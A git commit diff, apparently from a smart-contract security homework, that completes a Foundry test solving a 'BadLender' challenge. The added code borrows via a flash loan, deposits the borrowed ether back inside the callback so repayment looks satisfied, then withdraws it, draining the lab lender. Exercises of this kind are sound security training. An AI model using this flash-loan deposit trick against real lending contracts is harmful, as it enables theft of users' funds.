4db78f2f355a4974c26d41b8409508bc07cb6ffa
Tzu-Hao Lin <haroldlin.0921@gmail.com>
2024-08-24 16:07:47 +0800

    BadLender done

--- hw/test/Loan/BadLender.t.sol
+++ hw/test/Loan/BadLender.t.sol
@@ -6,6 +6,19 @@ import {BadLenderBaseTest} from "./BadLenderBase.t.sol";
 
 contract BadLenderTest is BadLenderBaseTest {
     function testExploit() external validation {
-       // TODO
+        vm.startPrank(address(this));
+        lender.flashLoan(100 ether);
+        lender.withdraw(100 ether);
+        vm.stopPrank();
+    }
+    
+    fallback() external payable{
+    }
+    
+    function execute() external payable{
+        vm.startPrank(address(this));
+        console2.log("addr.balance: ", address(this).balance);
+        lender.deposit{value: address(this).balance}();
+        vm.stopPrank();
     }
 }
